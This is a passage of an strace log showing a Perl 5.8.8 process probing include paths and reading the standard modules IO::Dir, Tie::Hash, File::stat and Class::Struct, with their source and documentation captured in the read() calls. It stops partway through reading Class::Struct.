8458  07:23:31.525749 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.525761 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.525780 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
8458  07:23:31.526295 stat64("/etc/perl/Tie/Hash.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526313 stat64("/etc/perl/Tie/Hash.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526326 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526339 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526353 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526365 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526393 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526435 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526463 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526497 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526511 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526524 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526538 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.526567 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
8458  07:23:31.526640 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.526691 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.526716 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.526772 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
8458  07:23:31.527244 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
8458  07:23:31.527837 read(8, "", 4096) = 0
8458  07:23:31.527852 close(8)          = 0
8458  07:23:31.527924 stat64("/etc/perl/File/stat.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.527941 stat64("/etc/perl/File/stat.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.527972 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.527985 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.527998 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528011 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528025 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528036 stat64("/usr/lib/perl5/File/stat.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528049 stat64("/usr/share/perl5/File/stat.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528061 stat64("/usr/share/perl5/File/stat.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528075 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528087 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528101 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.528114 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
8458  07:23:31.528135 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.528149 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.528161 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.528177 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
8458  07:23:31.528702 stat64("/etc/perl/Class/Struct.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.528720 stat64("/etc/perl/Class/Struct.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.528734 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.528746 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.528761 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.528773 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.528787 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.528799 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.528812 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.528824 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.528837 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.528850 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.528863 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.528876 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
8458  07:23:31.528897 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
8458  07:23:31.528912 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbaf8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.528923 _llseek(10, 0, [0], SEEK_CUR) = 0
8458  07:23:31.528954 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
8458  07:23:31.529393 brk(0x82de000)    = 0x82de000
8458  07:23:31.529436 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], 